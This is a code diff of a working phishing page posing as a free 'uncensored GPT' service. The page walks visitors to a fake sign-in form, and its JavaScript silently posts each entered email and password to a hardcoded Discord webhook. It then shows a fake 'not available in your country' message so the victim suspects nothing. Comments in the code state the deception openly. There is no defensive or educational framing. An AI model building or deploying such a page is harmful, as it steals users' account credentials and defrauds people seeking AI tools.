@@ -5,155 +5,195 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Uncensored GPT</title>
     <style>
+        @keyframes flicker {
+            0%, 100% { text-shadow: 0 0 5px #ff4800, 0 0 10px #ff4800, 0 0 20px #ff4800, 0 0 40px #ff0000; }
+            50% { text-shadow: 0 0 2px #ff4800, 0 0 5px #ff4800, 0 0 10px #ff0000, 0 0 20px #ff0000; }
+        }
+
         :root {
- --background-color: #1e1e1e;
- --form-bg-color: #2d2d2d;
- --text-color: #e0e0e0;
- --input-bg-color: #3c3c3c;
- --button-bg-color: #c23d3d;
- --button-hover-color: #a83535;
+            --background-color: #000000;
+            --form-bg-color: rgba(15, 15, 15, 0.85);
+            --text-color: #e0e0e0;
+            --input-bg-color: #2a0000;
+            --input-border-color: #660000;
+            --button-bg-color: #c20000;
+            --button-hover-color: #ff0000;
+            --glow-color: #ff0000;
         }
+
         body {
- font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
- background-color: var(--background-color);
- color: var(--text-color);
- display: flex;
- justify-content: center;
- align-items: center;
- height: 100vh;
- margin: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--background-color);
+            background-image: url('https://i.imgur.com/vHqBbyD.jpg'); /* Repeating flame pattern */
+            background-size: cover;
+            background-attachment: fixed;
+            background-blend-mode: multiply;
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
+
         .container {
- text-align: center;
- background-color: var(--form-bg-color);
- padding: 40px;
- border-radius: 12px;
- box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
- width: 320px;
+            text-align: center;
+            background-color: var(--form-bg-color);
+            padding: 40px;
+            border-radius: 12px;
+            border: 1px solid var(--input-border-color);
+            box-shadow: 0 0 35px rgba(255, 0, 0, 0.5);
+            width: 350px;
         }
+
         .logo {
- width: 80px;
- height: 80px;
- margin-bottom: 20px;
- /* This filter makes the SVG red */
- filter: grayscale(1) sepia(1) hue-rotate(315deg) saturate(5) brightness(0.9);
+            width: 150px;
+            height: 150px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            box-shadow: 0 0 20px var(--glow-color);
         }
-        h1 {
- margin: 0 0 25px 0;
- font-size: 24px;
- font-weight: 600;
+
+        h1, h2 {
+            margin: 0 0 25px 0;
+            font-size: 24px;
+            font-weight: 600;
+            color: #ffffff;
+            animation: flicker 2s infinite;
         }
-        .login-form input {
- width: 100%;
- padding: 12px;
- margin-bottom: 15px;
- border-radius: 6px;
- border: 1px solid var(--input-bg-color);
- background-color: var(--input-bg-color);
- color: var(--text-color);
- box-sizing: border-box;
- font-size: 16px;
+
+        p {
+            margin-top: -15px;
+            margin-bottom: 30px;
+            font-size: 16px;
         }
-        .login-form input:focus {
- outline: none;
- border-color: var(--button-bg-color);
+
+        .input-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--input-border-color);
+            background-color: var(--input-bg-color);
+            color: var(--text-color);
+            box-sizing: border-box;
+            font-size: 16px;
         }
-        .login-form button {
- width: 100%;
- padding: 12px;
- border: none;
- border-radius: 6px;
- background-color: var(--button-bg-color);
- color: white;
- font-size: 16px;
- font-weight: bold;
- cursor: pointer;
- transition: background-color 0.2s;
+
+        .input-form input:focus {
+            outline: none;
+            border-color: var(--glow-color);
+            box-shadow: 0 0 10px var(--glow-color);
         }
-        .login-form button:hover {
- background-color: var(--button-hover-color);
+
+        .action-button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            background-color: var(--button-bg-color);
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-shadow: 0 0 5px black;
         }
-        #final-message {
- display: none; /* Hidden by default */
- font-size: 18px;
- padding: 20px 0;
+
+        .action-button:hover {
+            background-color: var(--button-hover-color);
+            box-shadow: 0 0 15px var(--button-hover-color);
+        }
+
+        #step-2, #step-3 {
+            display: none; /* Hidden by default */
         }
     </style>
 </head>
 <body>
 
-    <div class="container" id="login-container">
-        <!-- A self-contained SVG for the ChatGPT logo -->
-        <svg class="logo" width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
- <path d="M35.216 20.5C35.216 28.663 28.663 35.216 20.5 35.216C12.337 35.216 5.784 28.663 5.784 20.5C5.784 12.337 12.337 5.784 20.5 5.784C23.2358 5.78405 25.8811 6.55191 28.168 7.948L25.891 10.225C24.249 9.253 22.411 8.731 20.5 8.731C13.91 8.731 8.731 13.91 8.731 20.5C8.731 27.09 13.91 32.269 20.5 32.269C27.09 32.269 32.269 27.09 32.269 20.5C32.269 19.826 32.203 19.167 32.08 18.529L34.931 17.761C35.129 18.663 35.216 19.576 35.216 20.5Z" fill="#FFFFFF"></path>
- <path d="M22.5899 15.239L20.0499 9.223L17.5099 15.239L11.4939 17.779L17.5099 20.319L20.0499 26.335L22.5899 20.319L28.6059 17.779L22.5899 15.239Z" fill="#FFFFFF"></path>
-        </svg>
-        <h1>uncensored gpt</h1>
-        <form class="login-form" id="login-form">
- <input type="email" id="email" placeholder="Email address" required>
- <input type="password" id="password" placeholder="Password" required>
- <button type="submit">Continue</button>
+    <!-- Step 1: Initial Landing Page -->
+    <div class="container" id="step-1">
+        <img src="https://i.imgur.com/k910T8M.png" alt="Demon AI" class="logo">
+        <h1>Welcome</h1>
+        <p>Your uncensored AI version of ChatGPT for free.</p>
+        <button class="action-button" id="next-button">Next</button>
+    </div>
+
+    <!-- Step 2: Login Form -->
+    <div class="container" id="step-2">
+        <img src="https://i.imgur.com/fBCF18F.png" alt="our infrastructure Logo" class="logo" style="width: 80px; height: 80px; filter: grayscale(1) invert(1);">
+        <h2>Sign in to our infrastructure</h2>
+        <form class="input-form" id="login-form">
+            <input type="email" id="email" placeholder="Email address" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="action-button">Continue</button>
         </form>
-        <div id="final-message">
- Not available in your country.
-        </div>
+    </div>
+
+    <!-- Step 3: Final Message -->
+    <div class="container" id="step-3">
+        <h1>Access Denied</h1>
+        <p>This app is not available in your country.</p>
     </div>
 
     <script>
+        // Get elements
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step3 = document.getElementById('step-3');
+        const nextButton = document.getElementById('next-button');
         const loginForm = document.getElementById('login-form');
-        const loginContainer = document.getElementById('login-container');
-        const finalMessage = document.getElementById('final-message');
 
+        // Handle transition from Step 1 to Step 2
+        nextButton.addEventListener('click', () => {
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+        });
+
+        // Handle form submission
         loginForm.addEventListener('submit', async (event) => {
- // 1. Prevent the form from reloading the page
- event.preventDefault();
+            event.preventDefault(); // Prevent page refresh
 
- // 2. Get the values from the input fields
- const email = document.getElementById('email').value;
- const password = document.getElementById('password').value;
- 
- // This is the "validation" check. It only ensures the fields are not empty.
- if (!email || !password) {
- return; // Do nothing if fields are empty
- }
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
- // 3. Define the webhook URL and the data payload
- const webhookUrl = 'https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p';
- const payload = {
- username: "Credential Bot",
- avatar_url: "https://i.imgur.com/fBCF18F.png",
- embeds: [{
- title: "New Login Captured",
- color: 12745742, // A reddish color
- fields: [
- { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
- { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
- ],
- footer: {
- text: `Captured at ${new Date().toISOString()}`
- }
- }]
- };
+            // Stop if fields are empty
+            if (!email || !password) return;
 
- // 4. Send the data to the Discord webhook silently
- try {
- await fetch(webhookUrl, {
- method: 'POST',
- headers: { 'Content-Type': 'application/json' },
- body: JSON.stringify(payload)
- });
- } catch (error) {
- // The fetch will happen in the background. Even if it fails,
- // the user experience continues, so they don't suspect anything.
- console.log("Error sending webhook, but proceeding for user.");
- }
- 
- // 5. Change the UI to complete the illusion
- loginForm.style.display = 'none'; // Hide the form
- finalMessage.style.display = 'block'; // Show the "unavailable" message
+            // --- THIS IS WHERE THE DATA IS SENT ---
+            const webhookUrl = 'https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p';
+            const payload = {
+                username: "DemonGPT Phisher",
+                avatar_url: "https://i.imgur.com/k910T8M.png",
+                embeds: [{
+                    title: "New our infrastructure Credentials Captured",
+                    color: 13369344, // Fiery Red
+                    fields: [
+                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
+                    ],
+                    footer: { text: `Captured at ${new Date().toUTCString()}` }
+                }]
+            };
+
+            // Send to webhook in the background. The user sees nothing.
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                // Ignore errors. The primary goal is to not alert the user.
+            }
+
+            // --- COMPLETE THE ILLUSION ---
+            step2.style.display = 'none';
+            step3.style.display = 'block';
         });
     </script>
 
 </body>
 </html>
-
